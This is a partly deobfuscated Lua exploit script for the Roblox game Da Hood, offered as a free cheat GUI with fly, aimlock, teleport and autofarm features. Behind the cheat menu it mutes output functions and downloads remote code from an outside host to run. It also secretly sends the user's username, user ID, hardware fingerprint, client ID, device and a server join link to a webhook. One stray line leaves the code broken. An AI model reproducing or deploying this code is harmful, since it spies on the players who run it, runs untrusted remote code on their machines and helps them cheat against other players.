local val = {}
local environment = getfenv()
local val2 = {}
local val3 = true

local function helper()
  local text = ""

  for i = 1, (math.random(25, 40)) do
    text = text .. (string.sub("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", math.random(
      1, #"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    ), math.random(
      1, #"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    )))
  end

  return text
end

local val4 = {
  getfenv = getfenv, setfenv = setfenv, rawget = rawget, rawset = rawset, getmetatable = getmetatable, setmetatable = setmetatable, newproxy = newproxy, tostring = tostring, require = require, type = type, next = next, pairs = pairs, pcall = pcall, }

local val5 = {}

local function helper2(val6)
  local val7 = helper()
  local text2 = ""
  local val8 = #val6

  for j = 1, val8 do
    local byteVal = string.byte(val6, j)
    local byteVal2 = string.byte(val7, j % #val7 + 1)
    text2 = text2 .. (string.char(bit32.bxor(byteVal, byteVal2)))
  end

  return text2, val7
end

for k = 1, 15 do
  local val9 = { helper2("_secureValue_" .. k) }

  val5[val9[1]] = function()
    local environment2 = val4.getfenv(2)

    if environment2 then
      for key, value in val4.pairs(environment2) do
        if (math.random()) > 0.5 then
          val4.rawset(environment2, key, nil)
        else
          val4.rawset(environment2, key, val5)
        end
      end
    end

    return nil
  end
end

function val:Initialize()
  local val10 = {}

  local val11 = {
    __index = function(object, key2)
      val2[key2] = (val2[key2] or 0) + 1

      if val5[key2] then
        val5[key2]()
        return nil
      else
        return environment[key2]
      end
    end, __newindex = function(object2, key3, value2)
      for index, value3 in ipairs({
        "getfenv", "setfenv", "require", "game", "script", "getmetatable", "setmetatable", }) do
        if key3 == value3 then
          return
        end
      end

      environment[key3] = value2
      return
    end, __metatable = "Locked", __tostring = function()
      local environment3 = val4.getfenv(2)

      if environment3 ~= environment then
        for key4, value4 in val4.pairs(environment3) do
          val4.rawset(environment3, key4, nil)
        end

        return ""
      else
        return "Environment"
      end
    end, }

  setmetatable(val10, val11)
  local val12 = getfenv

  function getfenv(...)
    local val13 = val12(2)

    if val3 and val13 ~= environment then
      return val10
    else
      return val12(...)
    end
  end

  local element = getmetatable((newproxy(true)))
  element.__index = val11.__index
  element.__newindex = val11.__newindex

  local function safeCall()

    if not (pcall(function() return (getfenv()), (getmetatable(game)) end)) then
      val3 = true
      return true
    else
      return false
    end
  end

  safeCall()

  spawn(function()
    while (wait(0.5)) do
      safeCall()
    end

    return
  end)

  return val10
end

setfenv(1, (val:Initialize()))

local character, userInputService, rbxAnalyticsService, marketplaceService, dataPing, val14, strVal, iterate, value5, getClientId, color, value6, getProductInfo, val15, main, val16, toggles, val17, target, val18, aimlocks, val19, teleports, val20, animations, val21, autofarm, val22, autoBuy, val23, misc, val24, settings, val25, val26, credits, screenGui, val27, val28, val29, val30, val31, val32, val33, val34, val35, val36, val37, val38, val39, val40, val41, val42, val43, val44, val45, val46, val47, val48, val49, val50, val51, val52, val53, val54, val55, val56, val57, val58, val59, localPlayer, createAnimation, character2, val60, createElement, helper3, helper4, helper5, helper6, val61, val62, val63, val64, val65, val66, val67, val68, val69, val70, val71, val72, val73, val74, val75, localPlayer2, val76, val77, val78, val79, val80, val81, val82, val83, val84, val85, val86, val87, val88, val89, val90, val91, helper7, iterate2, iterate3, helper8, helper9, helper10, helper11, waitLoop, waitLoop2, getMouse, val92, numVal, val93, getValueString, val94, val95, val96, val97, val98, val99, val100, val101, val102, val103, val104, val105, val106, val107, val108, val109, val110, val111, val112, val113, val114, val115, val116, val117, val118, val119, val120, val121, val122, val123, val124, val125, val126, val127, val128, val129, val130, val131, val132, val133, val134, val135, val136, val137, val138, val139, helper12, helper13, iterate4, val140, val141, val142, val143, val144, val145, val146, val147, val148, val149, val150, val151, val152, val153, val154, success, val155, val156, val157, val158, virtualUser, notify, val159, httpService, ui, touchEnabled, helper14, val160, connect, val161, flyPart, connect2, val162, createElement2, helper15, val163, val164, val165, val166, val167, val168, val169, val170, val171, connect3, val172, connect4, val173, val174, val175, val176, instance, instance2, findFirstChild, helper16, val177, val178, helper17, val179, waitLoop3, val180, val181, val182, val183, waitLoop4, val184, userInputService2, localPlayer3, val185, val186, waitLoop5, waitLoop6, waitLoop7, line, iterate5, val187, val188, val189, val190, val191, val192, val193, val194, val195, val196, val197, val198, val199, getMouse2, iterate6, helper18, val200, name, val201, val202, val203, val204, val205, val206, helper19, connect5, connect6, val207, val208, val209, val210, position, val211, position2, val212, val213, val214, val215, val216, position3, val217, position4, val218, val219, waitLoop8, val220, val221, val222, val223, connect7, val224, helper20, iterate7, val225, val226, val227, iterate8, val228, val229

if TBODaHood then
  return
else
  getgenv().TBODaHood = true

  if (string.find(game:HttpGet("https://peeky.pythonanywhere.com/Alive"), "yes")) then
    if not fireclickdetector then
      val157 = false

      game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
        val157 = false
        return
      end)

      getgenv().fireclickdetector = function(p2, p3, p4)

        if not val157 then
          val157 = true

          local virtualInputManager = game:GetService("VirtualInputManager")
          virtualInputManager:SendKeyEvent(true, 101, false, peeky)
        end

        if (game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool")) then

          game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
        end

        local clickDetector = (p2:FindFirstChild("ClickDetector")) or p2
        local parent = clickDetector.Parent

        local part = Instance.new("Part")
        part.Transparency = 1
        part.Size = Vector3.new(30, 30, 30)
        part.Anchored = true
        part.CanCollide = false
        part.Parent = workspace

        clickDetector.Parent = part
        clickDetector.MaxActivationDistance = math.huge

        local connect8 = game:GetService("RunService").Heartbeat:Connect(function()

          part.CFrame = workspace.Camera.CFrame * (CFrame.new(0, 0, -20))
            * (CFrame.new(workspace.Camera.CFrame.LookVector))

          local virtualUser2 = game:GetService("VirtualUser")

          virtualUser2:ClickButton1(
            Vector2.new(20, 20), workspace:FindFirstChildOfClass("Camera").CFrame
          )

          return
        end)

        clickDetector.MouseClick:Once(function()
          connect8:Disconnect()
          clickDetector.Parent = parent
          part:Destroy()
          return
        end)

        task.delay(3, function()
          connect8:Disconnect()
          clickDetector.Parent = parent
          part:Destroy()
          return
        end)

        return
      end
    end

    local 

    local function safeCall2(val230)
      local val231, success2 = pcall(function() return isnetworkowner(val230) end)
      return val231, success2
    end

    if not isnetworkowner then
      getgenv().isnetworkowner = function(p6)
        local val232 = (typeof(p6)) == "Instance"

        local basePart = val232
        basePart = val232 and p6:IsA("BasePart")

        assert(basePart, "arg #1 must be BasePart")

        if p6.Anchored then
          return false
        else
          return p6.ReceiveAge == 0
        end
      end
    else
      local part = { safeCall2((Instance.new("Part"))) }

      if not part[1] or part[2] ~= true then
        getgenv().isnetworkowner = function(p7)
          local val233 = (typeof(p7)) == "Instance"

          local basePart2 = val233
          basePart2 = val233 and p7:IsA("BasePart")

          assert(basePart2, "arg #1 must be BasePart")

          if p7.Anchored then
            return false
          else
            return p7.ReceiveAge == 0
          end
        end
      end
    end

    val158 = {
      print = print, warn = warn, setclipboard = setclipboard, writefile = writefile, appendfile = appendfile, }

    getgenv().print = function() return end
    getgenv().warn = function() return end
    getgenv().setclipboard = function() return end
    getgenv().writefile = function() return end
    getgenv().appendfile = function() return end

    local val234 = request
    local val235 = val234

    if not val234 then
      local httpRequest = http_request
      local val236 = httpRequest

      if not httpRequest then

        val236 = http and http.request or syn.request
      end

      val235 = val236
    end

    local rbxGeneral = game:GetService("TextChatService").TextChannels.RBXGeneral

    if game.Players.LocalPlayer.UserId
      ~= rbxGeneral:FindFirstChild(game.Players.LocalPlayer.Name).UserId then

      local rbxGeneral2 = game:GetService("TextChatService").TextChannels.RBXGeneral
      game.Players.LocalPlayer.UserId = rbxGeneral2:FindFirstChild(game.Players.LocalPlayer.Name).UserId
    end

    virtualUser = game:GetService("VirtualUser")

    game:GetService("Players").LocalPlayer.Idled:Connect(function()
      virtualUser:Button2Down(
        Vector2.new(0, 0), game:GetService("Workspace").CurrentCamera.CFrame
      )

      task.wait(1)

      virtualUser:Button2Up(
        Vector2.new(0, 0), game:GetService("Workspace").CurrentCamera.CFrame
      )

      return
    end)

    notify = loadstring(game:HttpGet("https://peeky.pythonanywhere.com/Notification"))().Notify

    local tbo = game.Players.LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("TBO")

    if tbo then
      tbo:Destroy()
    end

    local tbo2 = Instance.new("ScreenGui")
    tbo2.Name = "TBO"

    tbo2.Parent = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
    tbo2.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Parent = tbo2
    frame.Size = UDim2.new(0, 420, 0, 190)
    frame.Position = UDim2.new(0.5, -210, 0.5, -95)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Active = true

    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

    local instance3 = Instance.new("Frame", frame)
    instance3.Size = UDim2.new(1, 16, 1, 16)
    instance3.Position = UDim2.new(0.5, 0, 0.5, 0)
    instance3.AnchorPoint = Vector2.new(0.5, 0.5)
    instance3.BackgroundTransparency = 0.7
    instance3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    instance3.ZIndex = -1

    Instance.new("UIGradient", frame).Color = ColorSequence.new({
      (ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30))), ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 50)), })

    local instance4 = Instance.new("TextLabel", frame)
    instance4.Size = UDim2.new(1, -80, 0, 30)
    instance4.Position = UDim2.new(0, 38, 0, 5)
    instance4.Text = "TBO Loader"
    instance4.Font = Enum.Font.GothamBold
    instance4.TextSize = 28
    instance4.TextColor3 = Color3.fromRGB(255, 255, 255)
    instance4.BackgroundTransparency = 1

    local instance5 = Instance.new("TextLabel", frame)
    instance5.Size = UDim2.new(1, -20, 0, 20)
    instance5.Position = UDim2.new(0, 10, 0, 50)
    instance5.Font = Enum.Font.Gotham
    instance5.TextSize = 16
    instance5.TextColor3 = Color3.fromRGB(200, 200, 200)
    instance5.BackgroundTransparency = 1
    instance5.TextXAlignment = Enum.TextXAlignment.Left

    local instance6 = Instance.new("TextLabel", frame)
    instance6.Size = UDim2.new(1, -20, 0, 20)
    instance6.Position = UDim2.new(0, 10, 0, 70)
    instance6.Font = Enum.Font.Gotham
    instance6.TextSize = 16
    instance6.TextColor3 = Color3.fromRGB(200, 200, 200)
    instance6.BackgroundTransparency = 1
    instance6.TextXAlignment = Enum.TextXAlignment.Left

    local instance7 = Instance.new("TextLabel", frame)
    instance7.Size = UDim2.new(1, -20, 0, 20)
    instance7.Position = UDim2.new(0, 10, 0, 90)
    instance7.Font = Enum.Font.Gotham
    instance7.TextSize = 16
    instance7.TextColor3 = Color3.fromRGB(200, 200, 200)
    instance7.BackgroundTransparency = 1
    instance7.TextXAlignment = Enum.TextXAlignment.Left

    local instance8 = Instance.new("Frame", frame)
    instance8.Size = UDim2.new(1, -20, 0, 25)
    instance8.Position = UDim2.new(0, 10, 1, -40)
    instance8.BackgroundColor3 = Color3.fromRGB(40, 40, 40)

    Instance.new("UICorner", instance8).CornerRadius = UDim.new(0, 8)

    local instance9 = Instance.new("Frame", instance8)
    instance9.Size = UDim2.new(0, 0, 1, 0)
    instance9.BackgroundColor3 = Color3.fromRGB(0, 170, 255)

    Instance.new("UIGradient", instance9).Color = ColorSequence.new({
      (ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 200))), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 170, 255)), })

    instance5.Text = "Welcome, " .. game.Players.LocalPlayer.Name
    frame.Position = UDim2.new(0.5, -210, 1, 0)

    local tweenService = game:GetService("TweenService")

    tweenService:Create(frame, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {
      Position = (UDim2.new(0.5, -210, 0.5, -95)), }):Play()

    instance6.Text = "Waiting for Character..."

    game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField")

    repeat
      task.wait()
      instance7.Text = "Waiting for game..."
      character = game.Players.LocalPlayer.Character
    until not (character:FindFirstChildOfClass("ForceField"))

    val159 = 0

    local connect9 = game:GetService("RunService").Heartbeat:Connect(function()
      val159 = val159 + 1
      return
    end)

    repeat
      task.wait()
    until val159 >= 2

    connect9:Disconnect()

    instance6.Text = "Found Character!"
    instance6.TextColor3 = Color3.fromRGB(0, 255, 0)

    local val237 = game.GameId == 1008451066 or game.GameId == 3508322461

    local marketplaceService2 = game:GetService("MarketplaceService")
    instance7.Text = "Game: " .. marketplaceService2:GetProductInfo(game.PlaceId).Name

    if val237 then
      instance7.TextColor3 = Color3.fromRGB(0, 255, 0)
      instance7.Text = instance7.Text .. " - Supported"
    else
      instance7.TextColor3 = Color3.fromRGB(255, 0, 0)
      instance7.Text = instance7.Text .. " - Not Supported"
    end

    for m = 1, 100 do
      instance9.Size = UDim2.new(m / 100, 0, 1, 0)
      instance4.Text = "TBO Loader"
      task.wait(0.025)
    end

    local tweenService2 = game:GetService("TweenService")

    tweenService2:Create(
      frame, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Position = (UDim2.new(0.5, -210, 1, 0)), BackgroundTransparency = 1 }
    ):Play()

    task.wait(0.6)
    tbo2:Destroy()

    if game.GameId == 3508322461 then

      loadstring(game:HttpGet("https://peeky.pythonanywhere.com/jjs"))()
      return
    else
      if not val237 then
        return
      else

        httpService = game:GetService("HttpService")

        userInputService = game:GetService("UserInputService")

        if (userInputService:GetPlatform()) == Enum.Platform.Windows then
          device = "Windows"
        else

          local userInputService3 = game:GetService("UserInputService")

          if (userInputService3:GetPlatform()) == Enum.Platform.OSX then
            device = "macOS"
          else

            local userInputService4 = game:GetService("UserInputService")

            if (userInputService4:GetPlatform()) == Enum.Platform.IOS then
              device = "iOS"
            else

              local userInputService5 = game:GetService("UserInputService")

              if (userInputService5:GetPlatform()) == Enum.Platform.UWP then
                device = "Windows (Microsoft Store)"
              else

                local userInputService6 = game:GetService("UserInputService")

                if (userInputService6:GetPlatform()) == Enum.Platform.Android then
                  device = "Android Device"
                else
                  device = "Unknown"
                end
              end
            end
          end
        end

        strVal = tostring(game.JobId)

        function iterate()

          local val238, success3 = pcall(function()

            for key5, value7 in pairs(httpService:JSONDecode(request({
              Url = "https://httpbin.org/headers", }).Body).headers) do

              local lower = tostring(key5):lower()
              local findResult = string.find(lower, "fingerprint")

              local findResult2 = findResult
              findResult2 = findResult or string.find(lower, "identifier")

              if findResult2 and not (string.find(lower, "user")) then
                return value7
              end
            end

            return "Unavailable"
          end)

          return val238 and success3 or "Unavailable"
        end

        value5 = iterate()

        rbxAnalyticsService = game:GetService("RbxAnalyticsService")
        getClientId = rbxAnalyticsService:GetClientId()
        color = tonumber(255)
        value6 = tostring(game.Players.LocalPlayer.UserId)

        marketplaceService = game:GetService("MarketplaceService")
        getProductInfo = marketplaceService:GetProductInfo(game.PlaceId)

        dataPing = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]

        val14 = {
          embeds = {
            {
              title = "`` | Script executed: | ``", description = "**| TBO da hood gui free version has been executed! |**", type = "rich", color = color, fields = {
                {
                  name = "**Users Profile:**", value = "[" .. game.Players.LocalPlayer.Name
                    .. "'s Avatar](https://www.roblox.com/users/"
                    .. game.Players.LocalPlayer.UserId .. "/profile)", }, { name = "**Displayname:**", value = game.Players.LocalPlayer.DisplayName }, { name = "**UserID:**", value = value6 }, { name = "**Game Name:**", value = getProductInfo.Name }, {
                  name = "**Game Place ID:**", value = "[" .. game.PlaceId .. "](" .. "https://www.roblox.com/games/"
                    .. game.PlaceId .. ")", }, { name = "**HWID:**", value = value5 }, { name = "**Client ID:**", value = getClientId }, { name = "**Ping:**", value = (dataPing:GetValueString()) }, { name = "**Device:**", value = device }, { name = "**Executor:**", value = (identifyexecutor()) }, { name = "**Execution Time:**", value = (os.date("%Y-%m-%d %H:%M:%S")) }, {
                  name = "**Snipe Me:**", value = "[Snipe Me Teleport To Place Where Player Executed]("
                    .. ("https://peeky.pythonanywhere.com/join?placeId=" .. game.PlaceId
                      .. "&gameInstanceId=" .. strVal)
                    .. ")", }, }, }, }, }

        if syn then
          syn.request({
            Url = "https://peeky.pythonanywhere.com/webhook/sJ9grfzTUgza", Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = (httpService:JSONEncode(val14)), })
        else
          if request then
            request({
              Url = "https://peeky.pythonanywhere.com/webhook/sJ9grfzTUgza", Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = (httpService:JSONEncode(val14)), })
          else
            if val235 then
              val235({
                Url = "https://peeky.pythonanywhere.com/webhook/sJ9grfzTUgza", Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = (httpService:JSONEncode(val14)), })
            end
          end
        end

        task.delay(0.8, function()
          getgenv().print = val158.print
          getgenv().warn = val158.warn
          getgenv().setclipboard = val158.setclipboard
          getgenv().writefile = val158.writefile
          getgenv().appendfile = val158.appendfile

          return
        end)

        ui = loadstring(game:HttpGet("https://peeky.pythonanywhere.com/UiLib"))():CreateUI("TBO (Da Hood)")
        val15 = ui
        main = ui:AddTab("Main")
        val16 = ui
        toggles = ui:AddTab("Toggles")
        val17 = ui
        target = ui:AddTab("Target")
        val18 = ui
        aimlocks = ui:AddTab("Aimlocks")
        val19 = ui
        teleports = ui:AddTab("Teleports")
        val20 = ui
        animations = ui:AddTab("animations")
        val21 = ui
        autofarm = ui:AddTab("Autofarm")
        val22 = ui
        autoBuy = ui:AddTab("Auto Buy")
        val23 = ui
        misc = ui:AddTab("Misc")
        val24 = ui
        settings = ui:AddTab("Settings")
        val25 = ui
        ui:AddGlobalChat("Global Chat")
        val26 = ui
        credits = ui:AddTab("Credits")

        touchEnabled = game:GetService("UserInputService").TouchEnabled

        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ScreenGui"

        screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false

        ;(function()

          if not touchEnabled then

            game:GetService("UserInputService").InputBegan:Connect(function(input)
              if input.KeyCode == Enum.KeyCode.V then
                ui:Toggle()
              end

              return
            end)
          end

          return
        end)()

        if touchEnabled then
          local toggle = Instance.new("TextButton")
          toggle.Name = "Toggle"
          toggle.Parent = screenGui
          toggle.Position = UDim2.new(0, 1, 0.3, 0)
          toggle.Size = UDim2.new(0, 100, 0, 35)
          toggle.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
          toggle.Text = "Toggle"
          toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
          toggle.TextSize = 14
          toggle.TextStrokeTransparency = 0.5
          toggle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
          toggle.Draggable = true

          toggle.MouseButton1Click:Connect(function()
            ui:Toggle()
            return
          end)

          local corner = Instance.new("UICorner")
          corner.Name = "Corner"
          corner.Parent = toggle
        end

        game:GetService("RunService").RenderStepped:Connect(function()
          local animation = Instance.new("Animation")
          animation.AnimationId = "rbxassetid://3337994105"

          local loadAnimation = game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):LoadAnimation(animation)
          loadAnimation:Play()
          loadAnimation:Stop()

          return
        end)

        function helper14(val239)
          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val239

          local findFirstChild2 = workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name)

          if findFirstChild2 then
            findFirstChild2.Position = val239.Position
          end

          return
        end

        val160 = {
          W = false, A = false, S = false, D = false, }

        game:GetService("UserInputService").InputBegan:Connect(function(input2)
          if input2.KeyCode == Enum.KeyCode.W then
            val160.W = true
          else
            if input2.KeyCode == Enum.KeyCode.A then
              val160.A = true
            else
              if input2.KeyCode == Enum.KeyCode.S then
                val160.S = true
              else
                if input2.KeyCode == Enum.KeyCode.D then
                  val160.D = true
                end
              end
            end
          end

          return
        end)

        game:GetService("UserInputService").InputEnded:Connect(function(input3)
          if input3.KeyCode == Enum.KeyCode.W then
            val160.W = false
          else
            if input3.KeyCode == Enum.KeyCode.A then
              val160.A = false
            else
              if input3.KeyCode == Enum.KeyCode.S then
                val160.S = false
              else
                if input3.KeyCode == Enum.KeyCode.D then
                  val160.D = false
                end
              end
            end
          end

          return
        end)

        connect = nil
        val161 = 110

        function Fly()

          if not (game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildWhichIsA("BodyVelocity")) then
            local ignoredVelocity = Instance.new("BodyVelocity")
            ignoredVelocity.Name = "IgnoredVelocity"
            ignoredVelocity:SetAttribute("AllowedBM", true)
            ignoredVelocity.MaxForce = Vector3.new(0, 0, 0)
            ignoredVelocity.Velocity = Vector3.new(0, 0, 0)
            ignoredVelocity.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
          end

          if not (game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildWhichIsA("BodyGyro")) then
            local ignoredVelocity2 = Instance.new("BodyGyro")
            ignoredVelocity2.Name = "IgnoredVelocity"
            ignoredVelocity2:SetAttribute("AllowedBM", true)
            ignoredVelocity2.MaxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
            ignoredVelocity2.P = 1000
            ignoredVelocity2.D = 50
            ignoredVelocity2.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
          end

          local currentCamera = game:GetService("Workspace").CurrentCamera
          local zero = Vector3.zero

          connect = game:GetService("RunService").RenderStepped:Connect(function()

            local bodyVelocity = game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildWhichIsA("BodyVelocity")

            local bodyGyro = game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildWhichIsA("BodyGyro")
            local character3 = game.Players.LocalPlayer.Character
            local val240 = character3

            if character3 then

              local humanoidRootPart2 = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
              local val241 = humanoidRootPart2

              if humanoidRootPart2 then

                val241 = bodyVelocity and bodyGyro
              end

              val240 = val241
            end

            if val240 then
              bodyVelocity.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
              bodyGyro.MaxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
              game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true

              if getgenv().ironmanfly
                and game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then

                bodyGyro.CFrame = bodyGyro.CFrame:Lerp(currentCamera.CFrame
                  * (CFrame.Angles(math.rad(-45), 0, 0)), 0.09)
              else

                bodyGyro.CFrame = bodyGyro.CFrame:Lerp(currentCamera.CFrame, 0.09)
              end

              local zero2 = Vector3.zero
              local val242 = (identifyexecutor()) == "AWP"
              local val243 = val242

              if not val242 then
                local val244 = (identifyexecutor()) == "Swift"
                local touchEnabled2 = val244

                if not val244 then

                  touchEnabled2 = game:GetService("UserInputService").TouchEnabled
                end

                val243 = touchEnabled2
              end

              if val243 then

                local getMoveVector = require(game.Players.LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule")):GetMoveVector()

                if getMoveVector.X ~= 0 then
                  zero2 = zero2 + currentCamera.CFrame.RightVector * (getMoveVector.X * val161)
                end

                if getMoveVector.Z ~= 0 then
                  zero2 = zero2 - currentCamera.CFrame.LookVector * (getMoveVector.Z * val161)
                end
              else
                if val160.W then
                  zero2 = zero2 + currentCamera.CFrame.LookVector * val161
                end

                if val160.S then
                  zero2 = zero2 - currentCamera.CFrame.LookVector * val161
                end

                if val160.A then
                  zero2 = zero2 - currentCamera.CFrame.RightVector * val161
                end

                if val160.D then
                  zero2 = zero2 + currentCamera.CFrame.RightVector * val161
                end
              end

              zero = zero:Lerp(zero2, 0.04)
              bodyVelocity.Velocity = zero
            end

            return
          end)

          return
        end

        function unfly()
          game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = false

          local humanoidRootPart3 = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

          if humanoidRootPart3 then
            local bodyVelocity2 = humanoidRootPart3:FindFirstChildWhichIsA("BodyVelocity")

            if bodyVelocity2 and bodyVelocity2:GetAttribute("AllowedBM") then
              bodyVelocity2:Destroy()
            end

            local bodyGyro2 = humanoidRootPart3:FindFirstChildWhichIsA("BodyGyro")

            if bodyGyro2 and bodyGyro2:GetAttribute("AllowedBM") then
              bodyGyro2:Destroy()
            end
          end

          if connect then

            connect:Disconnect()
            connect = nil
          end

          return
        end

        flyPart = nil
        connect2 = nil

        function cframefly()

          if not game.Players.LocalPlayer.Character.HumanoidRootPart then
            return
          else
            game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true

            if not flyPart then
              flyPart = Instance.new("Part", game:GetService("Workspace"))
              flyPart.Name = "FlyPart"
              flyPart.Size = game.Players.LocalPlayer.Character.HumanoidRootPart.Size
              flyPart.Anchored = true
              flyPart.Transparency = 1
            end

            connect2 = game:GetService("RunService").Heartbeat:Connect(function()

              if game:GetService("UserInputService").TouchEnabled then

                local getMoveVector2 = require(game.Players.LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule")):GetMoveVector()

                local vectorToWorldSpace = game:GetService("Workspace").CurrentCamera.CFrame:VectorToWorldSpace(getMoveVector2)

                local heartbeat = game:GetService("RunService").Heartbeat

                flyPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                  + vectorToWorldSpace * val161 * (heartbeat:Wait())

                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = flyPart.CFrame
              else
                if val160.W then

                  local workspace = game:GetService("Workspace")

                  local heartbeat2 = game:GetService("RunService").Heartbeat

                  flyPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    + workspace.CurrentCamera.CFrame.LookVector * val161 * (heartbeat2:Wait())
                else
                  if val160.A then

                    local workspace2 = game:GetService("Workspace")

                    local heartbeat3 = game:GetService("RunService").Heartbeat

                    flyPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                      + -workspace2.CurrentCamera.CFrame.RightVector * val161 * (heartbeat3:Wait())
                  else
                    if val160.S then

                      local workspace3 = game:GetService("Workspace")

                      local heartbeat4 = game:GetService("RunService").Heartbeat

                      flyPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        + -workspace3.CurrentCamera.CFrame.LookVector * val161 * (heartbeat4:Wait())
                    else
                      if val160.D then

                        local workspace4 = game:GetService("Workspace")

                        local heartbeat5 = game:GetService("RunService").Heartbeat

                        flyPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                          + workspace4.CurrentCamera.CFrame.RightVector * val161 * (heartbeat5:Wait())
                      end
                    end
                  end
                end

                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = flyPart.CFrame
              end

              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                + game:GetService("Workspace").CurrentCamera.CFrame.LookVector)

              return
            end)

            return
          end
        end

        function uncframefly()

          if connect2 then

            connect2:Disconnect()
            connect2 = nil
          end

          game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false

          if game.Players.LocalPlayer.Character.HumanoidRootPart then
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false

            if flyPart then
              flyPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            end
          end

          return
        end

        function createElement()

          local findFirstChild3 = workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name)

          if not findFirstChild3 then
            return
          else
            local instance10 = Instance.new("BodyGyro", findFirstChild3)
            instance10.P = 90000
            instance10.MaxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
            instance10.CFrame = findFirstChild3.CFrame

            local instance11 = Instance.new("BodyVelocity", findFirstChild3)
            instance11.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
            instance11.Velocity = Vector3.new(0, 0.1, 0)

            val162 = true

            while val162 do
              local w = val160.W and 1 or 0
              local s = val160.S and -1 or 0
              local a = val160.A and -1 or 0
              local d = val160.D and 1 or 0

              if w + s ~= 0 or a + d ~= 0 then
                instance11.Velocity = (workspace.CurrentCamera.CFrame.LookVector * (w + s)
                    + workspace.CurrentCamera.CFrame.RightVector * (a + d))
                  * val161
              else
                instance11.Velocity = Vector3.new(0, 0.1, 0)
              end

              instance10.CFrame = workspace.CurrentCamera.CFrame
              wait()
            end

            instance11:Destroy()
            instance10:Destroy()
            return
          end
        end

        val162 = false

        function createElement2()

          local localPlayer = require(game.Players.LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
          vehicle = workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name)

          if not vehicle then
            return
          else
            bg = Instance.new("BodyGyro", vehicle)
            bg.P = 90000
            bg.maxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
            bg.cframe = vehicle.CFrame

            bv = Instance.new("BodyVelocity", vehicle)
            bv.velocity = Vector3.new(0, 0.1, 0)
            bv.maxForce = Vector3.new(9000000000, 9000000000, 9000000000)

            val162 = true

            while val162 do
              local getMoveVector3 = localPlayer:GetMoveVector()

              local velocity = (workspace.CurrentCamera.CFrame:VectorToWorldSpace(getMoveVector3))
                * val161

              if getMoveVector3.Magnitude > 0 then
                bv.velocity = velocity
              else
                bv.velocity = Vector3.new(0, 0.1, 0)
              end

              bg.cframe = workspace.CurrentCamera.CFrame
              wait()
            end

            return
          end
        end

        function helper15()
          val162 = false

          if bv then

            bv:Destroy()
          end

          if bg then

            bg:Destroy()
          end

          return
        end

        val163 = createElement
        val164 = false
        val165 = false

        getgenv().superherofly = false
